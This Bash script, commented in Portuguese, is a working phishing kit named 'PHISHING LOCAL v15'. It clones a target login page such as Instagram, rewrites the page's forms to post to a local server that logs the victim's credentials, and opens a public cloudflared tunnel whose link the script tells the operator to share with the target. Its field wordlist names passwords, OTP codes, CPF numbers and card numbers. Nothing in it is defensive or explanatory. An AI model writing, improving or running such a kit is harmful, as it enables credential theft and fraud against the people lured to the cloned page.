#!/bin/bash
# ============================================
# 🎣 PHISHING LOCAL v15 - Completo
# Menu: 1 Phish 2 Commit 3 Ver Capturas 4 Túnel 5 Sair
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
TUNNEL_PID_FILE="$SCRIPT_DIR/.tunnel.pid"

# =============================================
# WORDLIST DE CAMPOS DE LOGIN (nomes comuns)
# =============================================
FIELD_WORDS=(
    "user usuario username login email e-mail"
    "pass password senha pwd"
    "name nome fullname nome_completo"
    "phone telefone celular mobile"
    "cpf cnpj documento rg"
    "code codigo token otp verification_code"
    "address endereco rua city cidade"
    "birth data_nascimento nascimento date"
    "card cartao credit_card numero"
    "account conta account_number"
    "key chave secret"
    "answer resposta pergunta"
    "zip cep postal_code"
    "company empresa trabalho"
    "bio descricao sobre"
)

# =============================================
# DETECTAR TODOS OS CAMPOS DE UM FORMULÁRIO HTML
# =============================================
detect_fields() {
    local file="$1"
    local fields=""

    # Extrair names dos inputs
    fields=$(grep -oP 'name="[^"]*"' "$file" 2>/dev/null | sed 's/name="//;s/"//' | sort -u)
    echo "$fields"
}

# =============================================
# GERAR WORDLIST DE CAMPOS PARA CAPTURA
# =============================================
generate_field_wordlist() {
    local url="$1"
    local tmpfile="/tmp/fields_$RANDOM.txt"

    curl -s -L -o "$tmpfile" \
        -H "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" \
        "$url" 2>/dev/null

    local detected=$(detect_fields "$tmpfile")
    rm -f "$tmpfile"

    # Combinar detectados + wordlist padrão
    echo "$detected" | tr '\n' ' '
    for word_group in "${FIELD_WORDS[@]}"; do
        echo "$word_group"
    done | tr ' ' '\n' | sort -u | grep -v '^$'
}

# =============================================
# OBTER IP AUTOMÁTICO
# =============================================
get_my_ip() {
    local ip=""
    # Tentar wlan0 primeiro (Android)
    ip=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    # Fallback: qualquer interface
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    fi
    # Fallback final
    if [ -z "$ip" ]; then
        ip="127.0.0.1"
    fi
    echo "$ip"
}

# =============================================
# CLONAR SITE E INJETAR CAPTURA
# =============================================
clone_site() {
    local target_url="$1"
    local redirect_url="$2"
    local port="${3:-8080}"

    # Limpar site anterior
    rm -rf "$SITE_DIR"/*
    mkdir -p "$SITE_DIR"

    echo -e "${YELLOW}[...] Baixando HTML de $target_url${NC}"

    # Baixar página completa (HTML + CSS + JS)
    curl -s -L -o "$SITE_DIR/index.html" \
        -H "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" \
        "$target_url" 2>/dev/null

    # Baixar CSS
    local css_links=$(grep -oP 'href="[^"]*\.css[^"]*"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//')
    for css_url in $css_links; do
        if [[ "$css_url" == http* ]]; then
            curl -s -L -o "$SITE_DIR/style_$(basename "$css_url")" "$css_url" 2>/dev/null
        elif [[ "$css_url" == /* ]]; then
            local domain=$(echo "$target_url" | sed -E 's|(https?://[^/]+).*|\1|')
            curl -s -L -o "$SITE_DIR/style_$(basename "$css_url")" "${domain}${css_url}" 2>/dev/null
        fi
    done

    # Detectar campos do formulário
    echo -e "${YELLOW}[...] Detectando campos de login...${NC}"
    local fields=$(detect_fields "$SITE_DIR/index.html")
    echo -e "${GREEN}  Campos encontrados: ${WHITE}$fields${NC}"

    # Gerar wordlist de campos
    local all_fields=$(generate_field_words "$target_url")
    echo -e "${GREEN}  Wordlist de campos gerada (${#all_fields[@]} variações)${NC}"

    # Modificar formulários para captura
    # 1. Mudar action para /login local
    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"
    # 2. Adicionar method POST se não existir
    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
    # 3. Remover targets externos
    sed -i 's/target="[^"]*"//gi' "$SITE_DIR/index.html"

    # Trocar URLs absolutas pelo IP local
    local my_ip=$(get_my_ip)
    local domain=$(echo "$target_url" | sed -E 's|https?://||;s|/.*||')
    sed -i "s|https\?://${domain}|http://${my_ip}:${port}|g" "$SITE_DIR/index.html"

    # Salvar configuração
    cat > "$SITE_DIR/.config" << EOF
TARGET_URL=$target_url
REDIRECT_URL=$redirect_url
PORT=$port
MY_IP=$my_ip
FIELDS=$all_fields
EOF

    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✅ CLONE REALIZADO               ║${NC}"
    echo -e "${CYAN}╠═══════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║  Site: ${WHITE}$target_url${NC}"
    echo -e "${CYAN}║  Redirect: ${WHITE}$redirect_url${NC}"
    echo -e "${CYAN}╠═══════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  🔥 URL DO SERVIDOR:                     ║${NC}"
    echo -e "${GREEN}║    http://${my_ip}:${port}${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    # Iniciar servidor
    echo -e "${GREEN}[✓] Iniciando servidor na porta $port...${NC}"
    REDIRECT_URL="$redirect_url" PORT="$port" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" node "$SCRIPT_DIR/server/server.js" &
    echo $! > "$SCRIPT_DIR/.server.pid"
    sleep 1

    echo -e "${GREEN}[✓] Servidor rodando! Acesse no alvo: http://${my_ip}:${port}${NC}"
    echo ""
    echo -e "${YELLOW}Enter para voltar ao menu...${NC}"
    read
}

# =============================================
# VER CAPTURAS
# =============================================
view_captures() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         📋 CREDENCIAIS CAPTURADAS       ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    if [ ! -f "$LOG_FILE" ] || [ ! -s "$LOG_FILE" ]; then
        echo -e "${RED}  Nenhuma captura ainda.${NC}"
    else
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        local count=0
        while IFS= read -r line; do
            count=$((count + 1))
            echo -e "${CYAN}[$count]${NC} $line"
        done < "$LOG_FILE"
        echo -e "${WHITE}═══════════════════════════════════════════${NC}"
        echo -e "${GREEN}  Total: $count capturas${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Limpar capturas${NC}"
    echo -e "${YELLOW}2) Exportar para arquivo${NC}"
    echo -e "${YELLOW}Enter) Voltar${NC}"
    echo -n "> "
    read CHOICE

    case $CHOICE in
        1)
            > "$LOG_FILE"
            echo -e "${GREEN}[✓] Capturas limpas.${NC}"
            ;;
        2)
            echo -e "${YELLOW}Nome do arquivo:${NC}"
            echo -n "> "
            read ARQ
            [ -z "$ARQ" ] && ARQ="capturas_$(date +%Y%m%d_%H%M).txt"
            cp "$LOG_FILE" "$SCRIPT_DIR/$ARQ"
            echo -e "${GREEN}[✓] Salvo em $SCRIPT_DIR/$ARQ${NC}"
            ;;
    esac
}

# =============================================
# TÚNEL PÚBLICO (CLOUDFLARED)
# =============================================
start_tunnel() {
    clear
    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║         🌐 TÚNEL PÚBLICO                ║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
    echo ""

    # Verificar se servidor está rodando
    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
        echo -e "${RED}  Servidor não está rodando! Faça phish primeiro (opção 1).${NC}"
        echo ""
        echo -e "${YELLOW}Enter para voltar...${NC}"
        read
        return
    fi

    local port=$(grep 'PORT=' "$SITE_DIR/.config" 2>/dev/null | cut -d= -f2)
    [ -z "$port" ] && port=8080

    # Verificar cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}  cloudflared não instalado. Instalando...${NC}"
        pkg install -y cloudflared 2>/dev/null || {
            echo -e "${RED}  Falha ao instalar cloudflared. Tente manualmente.${NC}"
            echo ""
            echo -e "${YELLOW}Enter para voltar...${NC}"
            read
            return
        }
    fi

    echo -e "${YELLOW}[...] Iniciando túnel na porta $port...${NC}"
    cloudflared tunnel --url "http://localhost:$port" > "$SCRIPT_DIR/.tunnel.log" 2>&1 &
    local tunnel_pid=$!
    echo $tunnel_pid > "$TUNNEL_PID_FILE"

    sleep 3

    # Extrair URL do túnel
    local tunnel_url=$(grep -oP 'https://[a-z0-9]+\.trycloudflare\.com' "$SCRIPT_DIR/.tunnel.log" 2>/dev/null | head -1)

    if [ -n "$tunnel_url" ]; then
        echo ""
        echo -e "${GREEN}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🌐 TÚNEL ATIVO!                        ║${NC}"
        echo -e "${GREEN}╠═══════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║  ${WHITE}$tunnel_url${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}  Compartilhe esse link com o alvo.${NC}"
        echo -e "${YELLOW}  Funciona em qualquer lugar do mundo!${NC}"
    else
        echo -e "${RED}  Falha ao criar túnel. Verifique: $SCRIPT_DIR/.tunnel.log${NC}"
    fi

    echo ""
    echo -e "${YELLOW}1) Parar túnel${NC}"
    echo -e "${YELLOW}Enter) Voltar (túnel continua)${NC}"
    echo -n "> "
    read CHOICE

    if [ "$CHOICE" = "1" ]; then
        if [ -f "$TUNNEL_PID_FILE" ]; then
            kill $(cat "$TUNNEL_PID_FILE") 2>/dev/null
            rm -f "$TUNNEL_PID_FILE"
        fi
        pkill -f cloudflared 2>/dev/null
        echo -e "${GREEN}[✓] Túnel parado.${NC}"
    fi
}

# =============================================
# PARAR SERVIDOR
# ============================================
stop_server() {
    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
        local pid=$(cat "$SCRIPT_DIR/.server.pid")
        kill "$pid" 2>/dev/null
        rm -f "$SCRIPT_DIR/.server.pid"
        echo -e "${GREEN}[✓] Servidor parado.${NC}"
    else
        echo -e "${YELLOW}  Servidor não está rodando.${NC}"
    fi
    pkill -f "node.*server.js" 2>/dev/null
}

# =============================================
# COMMIT AUTOMÁTICO
# =============================================
do_commit() {
    echo -e "${YELLOW}[...] Fazendo commit...${NC}"
    cd "$SCRIPT_DIR"

    git add -A

    if git diff --cached --quiet; then
        echo -e "${YELLOW}  Nada pra commit.${NC}"
        return
    fi

    git commit -m "update: phishing-local v15 - $(date +%Y%m%d_%H%M)" --no-edit 2>/dev/null
    git push origin main --quiet 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Commit + push enviado!${NC}"
    else
        echo -e "${RED}[ERRO] Falha no push. Rode manualmente: git push${NC}"
    fi
}

# =============================================
# MENU PRINCIPAL
# =============================================
while true; do
    clear
    echo -e "${PURPLE}"
    echo "╔═══════════════════════════════════════════════════╗"
    echo "║        🎣 PHISHING LOCAL v15 - MENU             ║"
    echo "╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -e "${WHITE}ESCOLHA:${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} 🎣 PHISH - Clonar site e iniciar servidor"
    echo -e "  ${GREEN}2)${NC} 📋 CAPTURAS - Ver credenciais capturadas"
    echo -e "  ${GREEN}3)${NC} 🌐 TÚNEL - Criar URL pública (cloudflared)"
    echo -e "  ${GREEN}4)${NC} 🛑 PARAR - Desligar servidor/túnel"
    echo -e "  ${GREEN}5)${NC} 💾 COMMIT - Salvar no GitHub"
    echo ""
    echo -e "  ${RED}0)${NC} ❌ SAIR"
    echo ""
    echo -n "Escolha: "
    read ESCOLHA

    case $ESCOLHA in
        1)
            clear
            echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
            echo -e "${PURPLE}║         🎣 PHISH - Clonar Site          ║${NC}"
            echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
            echo ""
            echo -e "${YELLOW}URL do site para clonar:${NC}"
            echo -e "${WHITE}Ex: https://instagram.com${NC}"
            echo -n "> "
            read TARGET

            [ -z "$TARGET" ] && continue

            echo ""
            echo -e "${YELLOW}URL de redirect (pra onde mandar após login):${NC}"
            echo -e "${WHITE}Ex: https://instagram.com (deixar vazio = mesma URL)${NC}"
            echo -n "> "
            read REDIRECT

            [ -z "$REDIRECT" ] && REDIRECT="$TARGET"

            echo ""
            echo -e "${YELLOW}Porta (Enter = 8080):${NC}"
            echo -n "> "
            read PORT
            [ -z "$PORT" ] && PORT=8080

            clone_site "$TARGET" "$REDIRECT" "$PORT"
            ;;
        2)
            view_captures
            ;;
        3)
            start_tunnel
            ;;
        4)
            stop_server
            pkill -f cloudflared 2>/dev/null
            echo -e "${GREEN}[✓] Tudo parado.${NC}"
            echo -e "${YELLOW}Enter para voltar...${NC}"
            read
            ;;
        5)
            do_commit
            echo -e "${YELLOW}Enter para voltar...${NC}"
            read
            ;;
        0)
            stop_server
            pkill -f cloudflared 2>/dev/null
            echo -e "${GREEN}[✓] Saindo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Inválido!${NC}"
            ;;
    esac
done
